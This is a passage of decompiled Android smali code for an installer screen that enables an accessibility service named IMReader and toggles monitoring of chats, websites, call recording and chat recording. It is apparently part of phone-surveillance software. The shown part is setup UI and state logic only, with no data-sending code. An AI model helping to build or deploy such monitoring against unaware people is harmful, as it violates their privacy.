.class public Lhw/installer/FragmentInstallAccessibilityService;
.super Lhw/installer/a;
.source ""

# interfaces
.implements Landroid/view/View$OnClickListener;
.implements Lhw/imreader/ReaderAccessibilityService$c$a;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lhw/installer/FragmentInstallAccessibilityService$d;,
        Lhw/installer/FragmentInstallAccessibilityService$e;
    }
.end annotation


# instance fields
.field private Z:Lhw/installer/b;

.field private a0:Landroid/widget/Button;

.field private b0:Landroid/widget/TextView;

.field private c0:Z

.field private d0:Ljava/lang/Boolean;

.field private e0:Z


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-class v0, Lhw/installer/FragmentInstallAccessibilityService;

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    invoke-direct {p0}, Lhw/installer/a;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lhw/installer/FragmentInstallAccessibilityService;->c0:Z

    const/4 v1, 0x0

    iput-object v1, p0, Lhw/installer/FragmentInstallAccessibilityService;->d0:Ljava/lang/Boolean;

    iput-boolean v0, p0, Lhw/installer/FragmentInstallAccessibilityService;->e0:Z

    return-void
.end method

.method static synthetic A1(Lhw/installer/FragmentInstallAccessibilityService;)Z
    .locals 0

    invoke-direct {p0}, Lhw/installer/FragmentInstallAccessibilityService;->L1()Z

    move-result p0

    return p0
.end method

.method static synthetic B1(Lhw/installer/FragmentInstallAccessibilityService;)Z
    .locals 0

    invoke-direct {p0}, Lhw/installer/FragmentInstallAccessibilityService;->M1()Z

    move-result p0

    return p0
.end method

.method static synthetic C1(Lhw/installer/FragmentInstallAccessibilityService;)V
    .locals 0

    invoke-direct {p0}, Lhw/installer/FragmentInstallAccessibilityService;->J1()V

    return-void
.end method

.method static synthetic D1(Lhw/installer/FragmentInstallAccessibilityService;)Ljava/lang/Boolean;
    .locals 0

    iget-object p0, p0, Lhw/installer/FragmentInstallAccessibilityService;->d0:Ljava/lang/Boolean;

    return-object p0
.end method

.method static synthetic E1(Lhw/installer/FragmentInstallAccessibilityService;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 0

    iput-object p1, p0, Lhw/installer/FragmentInstallAccessibilityService;->d0:Ljava/lang/Boolean;

    return-object p1
.end method

.method static synthetic F1(Lhw/installer/FragmentInstallAccessibilityService;)Z
    .locals 0

    invoke-direct {p0}, Lhw/installer/FragmentInstallAccessibilityService;->K1()Z

    move-result p0

    return p0
.end method

.method static synthetic G1(Lhw/installer/FragmentInstallAccessibilityService;)V
    .locals 0

    invoke-direct {p0}, Lhw/installer/FragmentInstallAccessibilityService;->I1()V

    return-void
.end method

.method static synthetic H1(Lhw/installer/FragmentInstallAccessibilityService;Z)V
    .locals 0

    invoke-direct {p0, p1}, Lhw/installer/FragmentInstallAccessibilityService;->Q1(Z)V

    return-void
.end method

.method private I1()V
    .locals 7

    iget-object v0, p0, Lhw/installer/FragmentInstallAccessibilityService;->b0:Landroid/widget/TextView;

    const/4 v1, 0x2

    new-array v1, v1, [F

    fill-array-data v1, :array_0

    const-string v2, "Alpha"

    invoke-static {v0, v2, v1}, Landroid/animation/ObjectAnimator;->ofFloat(Ljava/lang/Object;Ljava/lang/String;[F)Landroid/animation/ObjectAnimator;

    move-result-object v0

    const-wide/16 v1, 0x3e8

    invoke-virtual {v0, v1, v2}, Landroid/animation/ObjectAnimator;->setDuration(J)Landroid/animation/ObjectAnimator;

    iget-object v1, p0, Lhw/installer/FragmentInstallAccessibilityService;->b0:Landroid/widget/TextView;

    const/4 v2, 0x3

    new-array v3, v2, [F

    fill-array-data v3, :array_1

    const-string v4, "ScaleX"

    invoke-static {v1, v4, v3}, Landroid/animation/ObjectAnimator;->ofFloat(Ljava/lang/Object;Ljava/lang/String;[F)Landroid/animation/ObjectAnimator;

    move-result-object v1

    const-wide/16 v3, 0x5dc

    invoke-virtual {v1, v3, v4}, Landroid/animation/ObjectAnimator;->setDuration(J)Landroid/animation/ObjectAnimator;

    new-instance v5, Landroid/view/animation/AccelerateInterpolator;

    invoke-direct {v5}, Landroid/view/animation/AccelerateInterpolator;-><init>()V

    invoke-virtual {v1, v5}, Landroid/animation/ObjectAnimator;->setInterpolator(Landroid/animation/TimeInterpolator;)V

    iget-object v5, p0, Lhw/installer/FragmentInstallAccessibilityService;->b0:Landroid/widget/TextView;

    new-array v2, v2, [F

    fill-array-data v2, :array_2

    const-string v6, "ScaleY"

    invoke-static {v5, v6, v2}, Landroid/animation/ObjectAnimator;->ofFloat(Ljava/lang/Object;Ljava/lang/String;[F)Landroid/animation/ObjectAnimator;

    move-result-object v2

    invoke-virtual {v2, v3, v4}, Landroid/animation/ObjectAnimator;->setDuration(J)Landroid/animation/ObjectAnimator;

    new-instance v3, Landroid/view/animation/AccelerateInterpolator;

    invoke-direct {v3}, Landroid/view/animation/AccelerateInterpolator;-><init>()V

    invoke-virtual {v2, v3}, Landroid/animation/ObjectAnimator;->setInterpolator(Landroid/animation/TimeInterpolator;)V

    new-instance v3, Landroid/animation/AnimatorSet;

    invoke-direct {v3}, Landroid/animation/AnimatorSet;-><init>()V

    new-instance v4, Lhw/installer/FragmentInstallAccessibilityService$a;

    invoke-direct {v4, p0}, Lhw/installer/FragmentInstallAccessibilityService$a;-><init>(Lhw/installer/FragmentInstallAccessibilityService;)V

    invoke-virtual {v3, v4}, Landroid/animation/AnimatorSet;->addListener(Landroid/animation/Animator$AnimatorListener;)V

    invoke-virtual {v3, v1}, Landroid/animation/AnimatorSet;->play(Landroid/animation/Animator;)Landroid/animation/AnimatorSet$Builder;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/animation/AnimatorSet$Builder;->with(Landroid/animation/Animator;)Landroid/animation/AnimatorSet$Builder;

    move-result-object v1

    invoke-virtual {v1, v0}, Landroid/animation/AnimatorSet$Builder;->with(Landroid/animation/Animator;)Landroid/animation/AnimatorSet$Builder;

    invoke-virtual {v3}, Landroid/animation/AnimatorSet;->start()V

    return-void

    :array_0
    .array-data 4
        0x0
        0x3f800000    # 1.0f
    .end array-data

    :array_1
    .array-data 4
        0x3f800000    # 1.0f
        0x3f8ccccd    # 1.1f
        0x3f800000    # 1.0f
    .end array-data

    :array_2
    .array-data 4
        0x3f800000    # 1.0f
        0x3f8ccccd    # 1.1f
        0x3f800000    # 1.0f
    .end array-data
.end method

.method private J1()V
    .locals 3

    iget-object v0, p0, Lhw/installer/FragmentInstallAccessibilityService;->b0:Landroid/widget/TextView;

    const/4 v1, 0x2

    new-array v1, v1, [F

    fill-array-data v1, :array_0

    const-string v2, "Alpha"

    invoke-static {v0, v2, v1}, Landroid/animation/ObjectAnimator;->ofFloat(Ljava/lang/Object;Ljava/lang/String;[F)Landroid/animation/ObjectAnimator;

    move-result-object v0

    const-wide/16 v1, 0x1f4

    invoke-virtual {v0, v1, v2}, Landroid/animation/ObjectAnimator;->setDuration(J)Landroid/animation/ObjectAnimator;

    new-instance v1, Lhw/installer/FragmentInstallAccessibilityService$b;

    invoke-direct {v1, p0}, Lhw/installer/FragmentInstallAccessibilityService$b;-><init>(Lhw/installer/FragmentInstallAccessibilityService;)V

    invoke-virtual {v0, v1}, Landroid/animation/ObjectAnimator;->addListener(Landroid/animation/Animator$AnimatorListener;)V

    invoke-virtual {v0}, Landroid/animation/ObjectAnimator;->start()V

    return-void

    nop

    :array_0
    .array-data 4
        0x3f800000    # 1.0f
        0x0
    .end array-data
.end method

.method private K1()Z
    .locals 3

    invoke-virtual {p0}, Lb/j/a/d;->c1()Lb/j/a/e;

    move-result-object v0

    invoke-static {v0}, Lhw/imreader/ReaderAccessibilityService;->i(Landroid/content/Context;)Z

    move-result v0

    invoke-static {}, Lhw/utils/o;->B0()Z

    move-result v1

    and-int/2addr v0, v1

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "checking IMReader service state: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "InstallAccessibility"

    invoke-static {v2, v1}, Lhw/utils/l;->s(Ljava/lang/String;Ljava/lang/String;)V

    return v0
.end method

.method private L1()Z
    .locals 2

    iget-object v0, p0, Lhw/installer/FragmentInstallAccessibilityService;->Z:Lhw/installer/b;

    const-string v1, "CHATS"

    invoke-virtual {v0, v1}, Lhw/installer/b;->I(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1

    iget-object v0, p0, Lhw/installer/FragmentInstallAccessibilityService;->Z:Lhw/installer/b;

    const-string v1, "WEBSITES"

    invoke-virtual {v0, v1}, Lhw/installer/b;->I(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    goto :goto_1

    :cond_1
    :goto_0
    const/4 v0, 0x1

    :goto_1
    return v0
.end method

.method private M1()Z
    .locals 2

    iget-object v0, p0, Lhw/installer/FragmentInstallAccessibilityService;->b0:Landroid/widget/TextView;

    invoke-virtual {v0}, Landroid/widget/TextView;->getAlpha()F

    move-result v0

    const/high16 v1, 0x3f800000    # 1.0f

    cmpl-float v0, v0, v1

    if-nez v0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method public static N1()Lhw/installer/FragmentInstallAccessibilityService;
    .locals 2

    new-instance v0, Lhw/installer/FragmentInstallAccessibilityService;

    invoke-direct {v0}, Lhw/installer/FragmentInstallAccessibilityService;-><init>()V

    new-instance v1, Landroid/os/Bundle;

    invoke-direct {v1}, Landroid/os/Bundle;-><init>()V

    invoke-virtual {v0, v1}, Lb/j/a/d;->i1(Landroid/os/Bundle;)V

    return-object v0
.end method

.method private O1()V
    .locals 2

    invoke-virtual {p0}, Lb/j/a/d;->n()Lb/j/a/e;

    move-result-object v0

    const/16 v1, 0x2725

    invoke-static {v0, v1}, Lhw/utils/o;->w(Landroid/app/Activity;I)V

    return-void
.end method

.method private P1()V
    .locals 3

    iget-object v0, p0, Lhw/installer/FragmentInstallAccessibilityService;->Z:Lhw/installer/b;

    const-string v1, "CHATS"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    iget-object v0, p0, Lhw/installer/FragmentInstallAccessibilityService;->Z:Lhw/installer/b;

    const-string v1, "WEBSITES"

    invoke-virtual {v0, v1, v2}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    return-void
.end method

.method private Q1(Z)V
    .locals 9

    invoke-virtual {p0}, Lb/j/a/d;->O()Landroid/view/View;

    move-result-object v0

    invoke-static {v0}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    check-cast v0, Landroid/view/View;

    sget v1, Lhw/installer/c;->c:I

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/Switch;

    const/4 v2, 0x1

    iput-boolean v2, p0, Lhw/installer/FragmentInstallAccessibilityService;->e0:Z

    sget v3, Lhw/installer/c;->C:I

    invoke-virtual {v0, v3}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/Switch;

    sget v4, Lhw/installer/c;->I:I

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/widget/Switch;

    sget v5, Lhw/installer/c;->A:I

    invoke-virtual {v0, v5}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v5

    check-cast v5, Landroid/widget/Switch;

    sget v6, Lhw/installer/c;->B:I

    invoke-virtual {v0, v6}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Switch;

    invoke-virtual {v3}, Landroid/widget/Switch;->isChecked()Z

    move-result v6

    const/16 v7, 0x8

    const/4 v8, 0x0

    if-eqz v6, :cond_0

    invoke-virtual {v4}, Landroid/widget/Switch;->isChecked()Z

    move-result v4

    if-eqz v4, :cond_0

    invoke-virtual {v5}, Landroid/widget/Switch;->isChecked()Z

    move-result v4

    if-eqz v4, :cond_0

    invoke-virtual {v0}, Landroid/widget/Switch;->getVisibility()I

    move-result v4

    if-eq v4, v7, :cond_1

    invoke-virtual {v0}, Landroid/widget/Switch;->isChecked()Z

    move-result v4

    if-eqz v4, :cond_0

    goto :goto_0

    :cond_0
    const/4 v2, 0x0

    :cond_1
    :goto_0
    invoke-virtual {v1, v2}, Landroid/widget/Switch;->setChecked(Z)V

    if-nez p1, :cond_2

    invoke-virtual {v1}, Landroid/widget/Switch;->isChecked()Z

    move-result p1

    if-eqz p1, :cond_2

    invoke-virtual {p0}, Lhw/installer/FragmentInstallAccessibilityService;->t1()V

    :cond_2
    invoke-virtual {v0}, Landroid/widget/Switch;->getVisibility()I

    move-result p1

    if-eq p1, v7, :cond_3

    invoke-virtual {v3}, Landroid/widget/Switch;->isChecked()Z

    move-result p1

    if-nez p1, :cond_4

    :cond_3
    invoke-virtual {v0, v8}, Landroid/widget/Switch;->setChecked(Z)V

    :cond_4
    iput-boolean v8, p0, Lhw/installer/FragmentInstallAccessibilityService;->e0:Z

    return-void
.end method

.method private R1(Landroid/view/View;Ljava/lang/Boolean;)V
    .locals 8

    const-string v0, "InstallAccessibility"

    const-string v1, "updateSwitchStates()"

    invoke-static {v0, v1}, Lhw/utils/l;->s(Ljava/lang/String;Ljava/lang/String;)V

    sget v0, Lhw/installer/c;->C:I

    invoke-virtual {p1, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Switch;

    sget v1, Lhw/installer/c;->I:I

    invoke-virtual {p1, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/Switch;

    sget v2, Lhw/installer/c;->A:I

    invoke-virtual {p1, v2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/Switch;

    sget v3, Lhw/installer/c;->B:I

    invoke-virtual {p1, v3}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/Switch;

    const/4 v3, 0x1

    const/4 v4, 0x0

    if-nez p2, :cond_0

    const/4 v5, 0x1

    goto :goto_0

    :cond_0
    const/4 v5, 0x0

    :goto_0
    iput-boolean v5, p0, Lhw/installer/FragmentInstallAccessibilityService;->c0:Z

    if-nez p2, :cond_1

    iget-object v5, p0, Lhw/installer/FragmentInstallAccessibilityService;->Z:Lhw/installer/b;

    const-string v6, "CHATS"

    invoke-virtual {v5, v6}, Lhw/installer/b;->I(Ljava/lang/String;)Z

    move-result v5

    goto :goto_1

    :cond_1
    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    :goto_1
    invoke-virtual {v0, v5}, Landroid/widget/Switch;->setChecked(Z)V

    if-nez p2, :cond_2

    iget-object v5, p0, Lhw/installer/FragmentInstallAccessibilityService;->Z:Lhw/installer/b;

    const-string v6, "WEBSITES"

    invoke-virtual {v5, v6}, Lhw/installer/b;->I(Ljava/lang/String;)Z

    move-result v5

    goto :goto_2

    :cond_2
    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    :goto_2
    invoke-virtual {v1, v5}, Landroid/widget/Switch;->setChecked(Z)V

    if-nez p2, :cond_3

    iget-object v5, p0, Lhw/installer/FragmentInstallAccessibilityService;->Z:Lhw/installer/b;

    const-string v6, "CALLREC"

    invoke-virtual {v5, v6}, Lhw/installer/b;->I(Ljava/lang/String;)Z

    move-result v5

    goto :goto_3

    :cond_3
    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    :goto_3
    invoke-virtual {v2, v5}, Landroid/widget/Switch;->setChecked(Z)V

    invoke-virtual {p1}, Landroid/widget/Switch;->getVisibility()I

    move-result v5

    const/16 v6, 0x8

    if-ne v5, v6, :cond_4

    invoke-virtual {p1, v4}, Landroid/widget/Switch;->setChecked(Z)V

    goto :goto_5

    :cond_4
    if-nez p2, :cond_5

    iget-object v5, p0, Lhw/installer/FragmentInstallAccessibilityService;->Z:Lhw/installer/b;

    const-string v7, "CHATREC"

    invoke-virtual {v5, v7}, Lhw/installer/b;->I(Ljava/lang/String;)Z

    move-result v5

    goto :goto_4

    :cond_5
    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    :goto_4
    invoke-virtual {p1, v5}, Landroid/widget/Switch;->setChecked(Z)V

    :goto_5
    if-nez p2, :cond_8

    sget p2, Lhw/installer/c;->c:I

    invoke-virtual {v1, p2}, Landroid/widget/Switch;->findViewById(I)Landroid/view/View;

    move-result-object p2

    check-cast p2, Landroid/widget/Switch;

    if-eqz p2, :cond_8

    invoke-virtual {v0}, Landroid/widget/Switch;->isChecked()Z

    move-result v0

    if-eqz v0, :cond_6

    invoke-virtual {v1}, Landroid/widget/Switch;->isChecked()Z

    move-result v0

    if-eqz v0, :cond_6

    invoke-virtual {v2}, Landroid/widget/Switch;->isChecked()Z

    move-result v0

    if-eqz v0, :cond_6

    invoke-virtual {p1}, Landroid/widget/Switch;->getVisibility()I

    move-result v0

    if-eq v0, v6, :cond_7

    invoke-virtual {p1}, Landroid/widget/Switch;->isChecked()Z

    move-result p1

    if-eqz p1, :cond_6

    goto :goto_6

    :cond_6
    const/4 v3, 0x0

    :cond_7
    :goto_6
    invoke-virtual {p2, v3}, Landroid/widget/Switch;->setChecked(Z)V

    :cond_8
    iput-boolean v4, p0, Lhw/installer/FragmentInstallAccessibilityService;->c0:Z

    return-void
.end method

.method static synthetic u1(Lhw/installer/FragmentInstallAccessibilityService;)Z
    .locals 0

    iget-boolean p0, p0, Lhw/installer/FragmentInstallAccessibilityService;->c0:Z

    return p0
.end method

.method static synthetic v1(Lhw/installer/FragmentInstallAccessibilityService;)Lhw/installer/b;
    .locals 0

    iget-object p0, p0, Lhw/installer/FragmentInstallAccessibilityService;->Z:Lhw/installer/b;

    return-object p0
.end method

.method static synthetic w1(Lhw/installer/FragmentInstallAccessibilityService;)Landroid/widget/TextView;
    .locals 0

    iget-object p0, p0, Lhw/installer/FragmentInstallAccessibilityService;->b0:Landroid/widget/TextView;

    return-object p0
.end method

.method static synthetic x1(Lhw/installer/FragmentInstallAccessibilityService;)Landroid/widget/Button;
    .locals 0

    iget-object p0, p0, Lhw/installer/FragmentInstallAccessibilityService;->a0:Landroid/widget/Button;

    return-object p0
.end method

.method static synthetic y1(Lhw/installer/FragmentInstallAccessibilityService;Landroid/view/View;Ljava/lang/Boolean;)V
    .locals 0

    invoke-direct {p0, p1, p2}, Lhw/installer/FragmentInstallAccessibilityService;->R1(Landroid/view/View;Ljava/lang/Boolean;)V

    return-void
.end method

.method static synthetic z1(Lhw/installer/FragmentInstallAccessibilityService;)Z
    .locals 0

    iget-boolean p0, p0, Lhw/installer/FragmentInstallAccessibilityService;->e0:Z

    return p0
.end method


# virtual methods
.method public B0()V
    .locals 2

    const-string v0, "InstallAccessibility"

    const-string v1, "onStart FragmentInstallAccessibilityService"

    invoke-static {v0, v1}, Lhw/utils/l;->s(Ljava/lang/String;Ljava/lang/String;)V

    invoke-super {p0}, Lb/j/a/d;->B0()V

    const/4 v0, 0x1

    invoke-direct {p0, v0}, Lhw/installer/FragmentInstallAccessibilityService;->Q1(Z)V

    iget-object v0, p0, Lhw/installer/FragmentInstallAccessibilityService;->d0:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-direct {p0}, Lhw/installer/FragmentInstallAccessibilityService;->M1()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-direct {p0}, Lhw/installer/FragmentInstallAccessibilityService;->J1()V

    goto :goto_0

    :cond_0
    iget-object v0, p0, Lhw/installer/FragmentInstallAccessibilityService;->d0:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_1

    invoke-direct {p0}, Lhw/installer/FragmentInstallAccessibilityService;->M1()Z

    move-result v0

    if-nez v0, :cond_1

    invoke-direct {p0}, Lhw/installer/FragmentInstallAccessibilityService;->L1()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-direct {p0}, Lhw/installer/FragmentInstallAccessibilityService;->I1()V

    :cond_1
    :goto_0
    return-void
.end method

.method public a0(IILandroid/content/Intent;)V
    .locals 0

    invoke-super {p0, p1, p2, p3}, Lb/j/a/d;->a0(IILandroid/content/Intent;)V

    return-void
.end method

.method public b()V
    .locals 2

    const-string v0, "InstallAccessibility"

    const-string v1, "onStartSrv"

    invoke-static {v0, v1}, Lhw/utils/l;->s(Ljava/lang/String;Ljava/lang/String;)V

    sget-object v1, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    iput-object v1, p0, Lhw/installer/FragmentInstallAccessibilityService;->d0:Ljava/lang/Boolean;

    invoke-virtual {p0}, Lb/j/a/d;->n()Lb/j/a/e;

    move-result-object v1

    if-nez v1, :cond_0

    const-string v1, "No Activity!"

    invoke-static {v0, v1}, Lhw/utils/l;->s(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Lhw/imreader/ReaderAccessibilityService;->k()V

    :cond_0
    return-void
.end method

.method public f()V
    .locals 3

    const-string v0, "InstallAccessibility"

    :try_start_0
    const-string v1, "onStopSrv"

    invoke-static {v0, v1}, Lhw/utils/l;->s(Ljava/lang/String;Ljava/lang/String;)V

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    iput-object v1, p0, Lhw/installer/FragmentInstallAccessibilityService;->d0:Ljava/lang/Boolean;

    invoke-virtual {p0}, Lb/j/a/d;->n()Lb/j/a/e;

    move-result-object v1

    if-nez v1, :cond_0

    const-string v1, "No Activity!"

    invoke-static {v0, v1}, Lhw/utils/l;->s(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Lhw/imreader/ReaderAccessibilityService;->k()V

    return-void

    :cond_0
    invoke-direct {p0}, Lhw/installer/FragmentInstallAccessibilityService;->P1()V

    invoke-virtual {p0}, Lb/j/a/d;->n()Lb/j/a/e;

    move-result-object v1

    new-instance v2, Lhw/installer/FragmentInstallAccessibilityService$c;

    invoke-direct {v2, p0}, Lhw/installer/FragmentInstallAccessibilityService$c;-><init>(Lhw/installer/FragmentInstallAccessibilityService;)V

    invoke-virtual {v1, v2}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    const-string v2, "oSr"

    invoke-static {v0, v2, v1}, Lhw/utils/l;->u(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :goto_0
    return-void
.end method

.method public f0(Landroid/os/Bundle;)V
    .locals 2

    const-string v0, "InstallAccessibility"

    const-string v1, "onCreate FragmentInstallAccessibilityService"

    invoke-static {v0, v1}, Lhw/utils/l;->s(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p0}, Lb/j/a/d;->c1()Lb/j/a/e;

    move-result-object v0

    invoke-static {v0}, Landroidx/lifecycle/v;->b(Lb/j/a/e;)Landroidx/lifecycle/u;

    move-result-object v0

    const-class v1, Lhw/installer/b;

    invoke-virtual {v0, v1}, Landroidx/lifecycle/u;->a(Ljava/lang/Class;)Landroidx/lifecycle/t;

    move-result-object v0

    check-cast v0, Lhw/installer/b;

    iput-object v0, p0, Lhw/installer/FragmentInstallAccessibilityService;->Z:Lhw/installer/b;

    invoke-super {p0, p1}, Lb/j/a/d;->f0(Landroid/os/Bundle;)V

    invoke-static {p0}, Lhw/imreader/ReaderAccessibilityService;->m(Lhw/imreader/ReaderAccessibilityService$c$a;)V

    return-void
.end method

.method public j0(Landroid/view/LayoutInflater;Landroid/view/ViewGroup;Landroid/os/Bundle;)Landroid/view/View;
    .locals 3

    const-string p3, "InstallAccessibility"

    const-string v0, "onCreateView FragmentInstallAccessibilityService"

    invoke-static {p3, v0}, Lhw/utils/l;->s(Ljava/lang/String;Ljava/lang/String;)V

    sget p3, Lhw/installer/d;->b:I

    const/4 v0, 0x0

    invoke-virtual {p1, p3, p2, v0}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;Z)Landroid/view/View;

    move-result-object p1

    sget p2, Lhw/installer/c;->C:I

    invoke-virtual {p1, p2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object p2

    check-cast p2, Landroid/widget/Switch;

    new-instance p3, Lhw/installer/FragmentInstallAccessibilityService$e;

    const-string v1, "CHATS"

    invoke-direct {p3, p0, v1}, Lhw/installer/FragmentInstallAccessibilityService$e;-><init>(Lhw/installer/FragmentInstallAccessibilityService;Ljava/lang/String;)V

    invoke-virtual {p2, p3}, Landroid/widget/Switch;->setOnCheckedChangeListener(Landroid/widget/CompoundButton$OnCheckedChangeListener;)V

    sget p2, Lhw/installer/c;->I:I

    invoke-virtual {p1, p2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object p2

    check-cast p2, Landroid/widget/Switch;

    new-instance p3, Lhw/installer/FragmentInstallAccessibilityService$e;

    const-string v1, "WEBSITES"

    invoke-direct {p3, p0, v1}, Lhw/installer/FragmentInstallAccessibilityService$e;-><init>(Lhw/installer/FragmentInstallAccessibilityService;Ljava/lang/String;)V

    invoke-virtual {p2, p3}, Landroid/widget/Switch;->setOnCheckedChangeListener(Landroid/widget/CompoundButton$OnCheckedChangeListener;)V

    sget p2, Lhw/installer/c;->A:I

    invoke-virtual {p1, p2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object p2

    check-cast p2, Landroid/widget/Switch;

    new-instance p3, Lhw/installer/FragmentInstallAccessibilityService$e;

    const-string v1, "CALLREC"

    invoke-direct {p3, p0, v1}, Lhw/installer/FragmentInstallAccessibilityService$e;-><init>(Lhw/installer/FragmentInstallAccessibilityService;Ljava/lang/String;)V

    invoke-virtual {p2, p3}, Landroid/widget/Switch;->setOnCheckedChangeListener(Landroid/widget/CompoundButton$OnCheckedChangeListener;)V

    sget p2, Lhw/installer/c;->B:I

    invoke-virtual {p1, p2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object p2

    check-cast p2, Landroid/widget/Switch;

    new-instance p3, Lhw/installer/FragmentInstallAccessibilityService$e;

    const-string v1, "CHATREC"

    invoke-direct {p3, p0, v1}, Lhw/installer/FragmentInstallAccessibilityService$e;-><init>(Lhw/installer/FragmentInstallAccessibilityService;Ljava/lang/String;)V

    invoke-virtual {p2, p3}, Landroid/widget/Switch;->setOnCheckedChangeListener(Landroid/widget/CompoundButton$OnCheckedChangeListener;)V

    sget p3, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1c

    if-le p3, v1, :cond_0

    const/4 v2, 0x1

    goto :goto_0

    :cond_0
    const/4 v2, 0x0

    :goto_0
    invoke-virtual {p2, v2}, Landroid/widget/Switch;->setEnabled(Z)V

    sget v2, Lhw/installer/c;->h0:I

    invoke-virtual {p1, v2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    if-le p3, v1, :cond_1

    invoke-virtual {p2, v0}, Landroid/widget/Switch;->setVisibility(I)V

    invoke-virtual {v2, v0}, Landroid/widget/TextView;->setVisibility(I)V

    goto :goto_1

    :cond_1
    const/16 p3, 0x8

    invoke-virtual {p2, p3}, Landroid/widget/Switch;->setVisibility(I)V

    invoke-virtual {v2, p3}, Landroid/widget/TextView;->setVisibility(I)V

    :goto_1
    sget p2, Lhw/installer/c;->a:I

    invoke-virtual {p1, p2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object p2

    check-cast p2, Landroid/widget/Button;

    iput-object p2, p0, Lhw/installer/FragmentInstallAccessibilityService;->a0:Landroid/widget/Button;

    invoke-virtual {p2, p0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    sget p2, Lhw/installer/c;->i0:I

    invoke-virtual {p1, p2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object p2

    check-cast p2, Landroid/widget/TextView;

    iput-object p2, p0, Lhw/installer/FragmentInstallAccessibilityService;->b0:Landroid/widget/TextView;

    invoke-direct {p0}, Lhw/installer/FragmentInstallAccessibilityService;->K1()Z

    move-result p2

    invoke-static {p2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p2

    iput-object p2, p0, Lhw/installer/FragmentInstallAccessibilityService;->d0:Ljava/lang/Boolean;

    const/4 p2, 0x0

    invoke-direct {p0, p1, p2}, Lhw/installer/FragmentInstallAccessibilityService;->R1(Landroid/view/View;Ljava/lang/Boolean;)V

    sget p3, Lhw/installer/c;->c:I

    invoke-virtual {p1, p3}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Switch;

    if-eqz v0, :cond_2

    new-instance p3, Lhw/installer/FragmentInstallAccessibilityService$d;

    invoke-direct {p3, p0, p2}, Lhw/installer/FragmentInstallAccessibilityService$d;-><init>(Lhw/installer/FragmentInstallAccessibilityService;Lhw/installer/FragmentInstallAccessibilityService$a;)V

